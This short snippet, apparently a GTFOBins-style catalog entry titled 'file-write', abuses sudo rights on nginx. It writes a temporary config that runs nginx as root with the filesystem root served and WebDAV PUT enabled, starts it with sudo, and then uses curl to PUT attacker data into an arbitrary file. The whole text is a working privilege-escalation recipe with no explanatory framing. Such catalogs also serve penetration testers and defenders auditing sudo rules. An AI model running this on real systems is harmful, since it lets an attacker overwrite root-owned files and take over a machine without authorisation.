file-write.code:
PORT=1337
LFILE=file_to_write
TF=$(mktemp)
echo DATA >$TF
TFC=$(mktemp)
cat > $TFC << EOF
user root;
events {
  worker_connections 1024;
}
http {
  server {
    listen $PORT;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
EOF
sudo nginx -c $TFC
curl -X PUT http://localhost:$PORT$LFILE -d @$TF
